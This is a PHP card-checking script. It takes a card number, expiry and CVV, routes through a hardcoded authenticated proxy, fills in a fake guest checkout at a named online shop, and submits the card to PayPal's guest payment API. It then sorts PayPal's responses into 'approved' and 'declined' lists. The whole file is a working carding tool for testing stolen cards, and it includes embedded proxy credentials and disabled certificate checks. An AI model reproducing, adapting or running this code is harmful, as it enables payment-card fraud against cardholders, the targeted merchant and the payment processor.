<?php
if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    exit;
}

$lista = $_GET['lista'];
$lista = str_replace(" ", "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/', '-', $lista);
$lista = str_replace("/", "|", $lista);
$separar = explode("|", $lista);

if (count($separar) < 4) {
    exit;
}

$cc = trim($separar[0]);
$mes = trim($separar[1]);
$ano_raw = trim($separar[2]);
$cvv = trim($separar[3]);

if (strlen($ano_raw) == 2) {
    $ano = "20" . $ano_raw;
} else {
    $ano = $ano_raw;
}
$ano = substr($ano, -2);

if (strlen($mes) == 1) {
    $mes = "0" . $mes;
}

$proxy = "http://dfdb84f4266943802d7a:cf82da99223b6ab4@gw.proxybrasil.com:823";

function gerarEmail()
{
    $l = 'abcdefghijklmnopqrstuvwxyz';
    $n = '0123456789';
    $s = '';
    for ($i = 0; $i < 3; $i++) $s .= $l[rand(0, 25)];
    for ($i = 0; $i < 4; $i++) $s .= $n[rand(0, 9)];
    return 'aice' . $s . (rand(0, 1) ? '@gmail.com' : '@outlook.com');
}

$email1 = gerarEmail();

$cookie = tempnam(sys_get_temp_dir(), 'funi_');
$UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:157.0) Gecko/20100101 Firefox/157.0';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/product/10239');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.footunijapan.com',
    'Referer: https://www.footunijapan.com/product/10239',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'cart_add_10239=t&cart_operation_page=product&cart_addquantity_10239=1&cart_add_btn=Add+to+Cart');
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/product/10239',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/customer');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/cart',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/customer?nonmember_register=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/cart/customer',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$post_customer = http_build_query([
    'customer_address_pref'    => '48',
    'nonmember_register'       => 't',
    'rules'                    => 't',
    'customer_name'            => 'max dilan',
    'customer_company_name'    => 'pai do val',
    'customer_department_name' => 'xvideo corp',
    'customer_address_country' => '238',
    'customer_address1'        => 'street its never over',
    'customer_address2'        => 'lab group',
    'customer_address3'        => 'new york',
    'customer_address_local'   => '33',
    'customer_address_postal'  => '10081',
    'customer_email'           => $email1,
    'customer_phone'           => '2172-0382123432',
    'customer_fax'             => '2342143232',
    'go-next'                  => 'Next',
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/customer');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.footunijapan.com',
    'Referer: https://www.footunijapan.com/cart/customer?nonmember_register=1',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_customer);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/shipping');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/cart/customer',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/shipping');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.footunijapan.com',
    'Referer: https://www.footunijapan.com/cart/shipping',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'shippingCount=1&cart_payment_display=t&delivery%5B1%5D%5Bshipping_list%5D=99999999&delivery%5B1%5D%5Bshipping_method%5D=2&pay_procedure=10000006&customer_comment=&go-next=Next');
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/cart/shipping',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://www.footunijapan.com',
    'Referer: https://www.footunijapan.com/cart/confirm',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'policy_agree=1&go-next=to+Payment+Procedure');
$r = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/cart/payment');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.footunijapan.com/cart/confirm',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$payment_html = curl_exec($ch);
curl_close($ch);
sleep(1);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.footunijapan.com/xml.php?go=paypal');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: */*',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Length: 0',
    'Origin: https://www.footunijapan.com',
    'Referer: https://www.footunijapan.com/cart/payment',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
]);
$xml = curl_exec($ch);
curl_close($ch);

$ec_token = json_decode($xml, true)['id'];
sleep(1);

$cookie2 = tempnam(sys_get_temp_dir(), 'pp_');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/checkoutnow?token=' . $ec_token . '&locale.x=en_US&country.x=US');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
]);
$checkout_html = curl_exec($ch);
curl_close($ch);

$card_token = $ec_token;
if (preg_match('/"token"\s*:\s*"([A-Z0-9]{17})"/', $checkout_html, $m)) {
    $card_token = $m[1];
} elseif (preg_match('/token=([A-Z0-9]{17})/', $checkout_html, $m)) {
    $card_token = $m[1];
}

$session_id = 'uid_' . strtolower($ec_token);
if (preg_match('/"sessionID"\s*:\s*"(uid_[a-z0-9_]+)"/', $checkout_html, $m)) {
    $session_id = $m[1];
}

$button_session_id = $session_id;
if (preg_match('/"buttonSessionID"\s*:\s*"(uid_[a-z0-9_]+)"/', $checkout_html, $m)) {
    $button_session_id = $m[1];
}

$sdk_meta_url = 'https://www.paypal.com/sdk/js?client-id=Ab4gT-gnA9A9hdtFIePswfHF0vDgrISoOknP1Pxr-sxVt71o0sCVDGoTrqyH95rEUwSB0CT_B6kOm8H9&merchant-id=T9C447QUM5536&currency=USD&locale=en_US';
$sdk_meta = base64_encode(json_encode([
    'url' => $sdk_meta_url,
    'attrs' => ['data-uid' => 'uid_' . strtolower($card_token)],
]));

$card_fields_url = 'https://www.paypal.com/smart/card-fields?' . http_build_query([
    'token' => $card_token,
    'sessionID' => $session_id,
    'buttonSessionID' => $button_session_id,
    'locale.x' => 'en_US',
    'commit' => 'true',
    'style.submitButton.display' => 'true',
    'hasShippingCallback' => 'false',
    'env' => 'production',
    'country.x' => 'US',
    'sdkMeta' => $sdk_meta,
    'disable-card' => '',
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $card_fields_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . $UA,
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Referer: https://www.paypal.com/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: iframe',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Storage-Access: none',
]);
$cf_html = curl_exec($ch);
curl_close($ch);

$integrity_token = null;
if (preg_match('/"integrityToken"\s*:\s*"([A-Za-z0-9_\-\.]+)"/', $cf_html, $m)) {
    $integrity_token = $m[1];
}

$card_type = 'VISA';
if (preg_match('/^3[47]/', $cc)) {
    $card_type = 'AMEX';
} elseif (preg_match('/^5[1-5]/', $cc)) {
    $card_type = 'MASTERCARD';
} elseif (preg_match('/^4/', $cc)) {
    $card_type = 'VISA';
} elseif (preg_match('/^6/', $cc)) {
    $card_type = 'DISCOVER';
}

$variables = [
    'token' => $card_token,
    'card' => [
        'cardNumber' => $cc,
        'type' => $card_type,
        'expirationDate' => $mes . '/20' . $ano,
        'postalCode' => '10081',
        'securityCode' => $cvv,
    ],
    'firstName' => 'dilan',
    'lastName' => 'max',
    'billingAddress' => [
        'givenName' => 'dilan',
        'familyName' => 'max',
        'line1' => 'street its never over',
        'line2' => '34',
        'city' => 'new york',
        'state' => 'NY',
        'postalCode' => '10081',
        'country' => 'US',
    ],
    'email' => $email1,
    'currencyConversionType' => 'VENDOR',
];
if ($integrity_token) {
    $variables['integrityToken'] = $integrity_token;
}

$query = 'mutation payWithCard($token: String!, $card: CardInput, $paymentToken: String, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $installmentTerm: Int, $identityDocument: IdentityDocumentInput, $feeReferenceId: String, $integrityToken: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, paymentToken: $paymentToken, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, installmentTerm: $installmentTerm, identityDocument: $identityDocument, feeReferenceId: $feeReferenceId, integrityToken: $integrityToken) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }';

function enviarPayPal($url, $payload, $headers, $cookieFile)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    $resp = curl_exec($ch);
    curl_close($ch);
    return $resp;
}

$headers_pp = [
    'User-Agent: ' . $UA,
    'Accept: */*',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type: application/json',
    'x-country: US',
    'x-app-name: standardcardfields',
    'paypal-client-context: ' . $card_token,
    'PayPal-Client-Metadata-Id: ' . $card_token,
    'Origin: https://www.paypal.com',
    'Referer: https://www.paypal.com/smart/card-fields?token=' . $card_token . '&sessionID=' . $session_id . '&buttonSessionID=' . $button_session_id . '&locale.x=en_US&commit=true',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'Priority: u=0',
];

$payload = json_encode([
    'query' => $query,
    'variables' => $variables,
    'operationName' => 'payWithCard',
]);

$resp = enviarPayPal('https://www.paypal.com/graphql?paywithcard', $payload, $headers_pp, $cookie2);
$data = json_decode($resp, true);

$needRetry = false;
if (!empty($data['errors'])) {
    foreach ($data['errors'] as $err) {
        foreach (($err['data'] ?? []) as $d) {
            if (($d['code'] ?? '') === 'CANNOT_ACCEPT_CURRENCY_CONVERSION_OPTION') {
                $needRetry = true;
            }
        }
    }
}

if ($needRetry) {
    $variables['currencyConversionType'] = 'PAYPAL';
    $payload = json_encode([
        'query' => $query,
        'variables' => $variables,
        'operationName' => 'payWithCard',
    ]);
    $resp = enviarPayPal('https://www.paypal.com/graphql?paywithcard', $payload, $headers_pp, $cookie2);
    $data = json_decode($resp, true);
}

$codes = [];
if (!empty($data['errors'])) {
    foreach ($data['errors'] as $err) {
        if (!empty($err['data'])) {
            foreach ($err['data'] as $d) {
                if (!empty($d['code'])) {
                    $codes[] = $d['code'];
                }
            }
        } elseif (!empty($err['message'])) {
            $codes[] = $err['message'];
        }
    }
} elseif (isset($data['data']['approveGuestPaymentWithCreditCard'])) {
    $r2 = $data['data']['approveGuestPaymentWithCreditCard'];
    if ($r2 === null) {
        $codes[] = 'DECLINED';
    } else {
        if (!empty($r2['cart']['buyer']['auth']['accessToken'])) {
            $codes[] = 'SUCCESS';
        }
        if (!empty($r2['flags']['is3DSecureRequired'])) {
            $codes[] = '3DS_REQUIRED';
        }
        if (!empty($r2['paymentContingencies']['threeDomainSecure']['status'])) {
            $codes[] = '3DS_' . $r2['paymentContingencies']['threeDomainSecure']['status'];
        }
        if (!empty($r2['cart']['returnUrl']['href'])) {
            $codes[] = 'RETURN_URL';
        }
        if (empty($codes)) {
            $codes[] = 'EMPTY';
        }
    }
} else {
    $codes[] = 'UNKNOWN';
}

$resultado = implode(' ', $codes);
$cartao = $cc . '|' . $mes . '|' . $ano . '|' . $cvv;

if (strpos($resultado, 'INVALID_SECURITY_CODE') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'INVALID_BILLING_ADDRESS') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'RISK_DISALLOWED') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'SUCCESS') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, '3DS_REQUIRED') !== false || strpos($resultado, '3DS_') !== false || strpos($resultado, 'RETURN_URL') !== false) {
    echo 'Aprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'ISSUER_DECLINE') !== false) {
    echo 'Reprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'CARD_GENERIC_ERROR') !== false) {
    echo 'Reprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'OAS_VALIDATION') !== false) {
    echo 'Reprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'INVALID_EXPIRATION') !== false) {
    echo 'Reprovada | ' . $cartao . ' | ' . $resultado;
} elseif (strpos($resultado, 'VALIDATION_ERROR') !== false) {
    echo 'Reprovada | ' . $cartao . ' | ' . $resultado;
} else {
    echo 'Desconhecido | ' . $cartao . ' | ' . $resultado;
}

if (file_exists($cookie)) @unlink($cookie);
if (file_exists($cookie2)) @unlink($cookie2);
?>